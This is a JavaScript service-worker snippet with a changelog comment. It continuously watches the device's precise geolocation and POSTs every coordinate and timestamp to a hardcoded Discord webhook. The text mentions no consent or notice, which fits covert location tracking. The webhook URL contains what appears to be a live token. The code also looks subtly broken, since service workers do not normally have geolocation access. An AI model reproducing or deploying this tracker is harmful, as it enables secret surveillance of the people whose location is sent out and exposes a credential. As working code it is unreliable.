// Changes from the Old Code:
// ✅ Removed Background Sync API – No longer needed.
// ✅ No Fetch Calls to /get-latest-location – Now, location is sent directly via a webhook.
// ✅ Live Geolocation Updates – Uses watchPosition() to send location continuously

self.addEventListener("message", (event) => {
    if (event.data.action === "startTracking") {
        navigator.geolocation.watchPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                const timestamp = new Date().toISOString();

                // Send location to the webhook
                fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude, longitude, timestamp }),
                })
                .then(response => response.json())
                .then(data => console.log("Webhook sent:", data))
                .catch(error => console.error("Error sending webhook:", error));
            },
            (error) => console.error("Geolocation error:", error),
            { enableHighAccuracy: true, maximumAge: 0 }
        );
    }
});
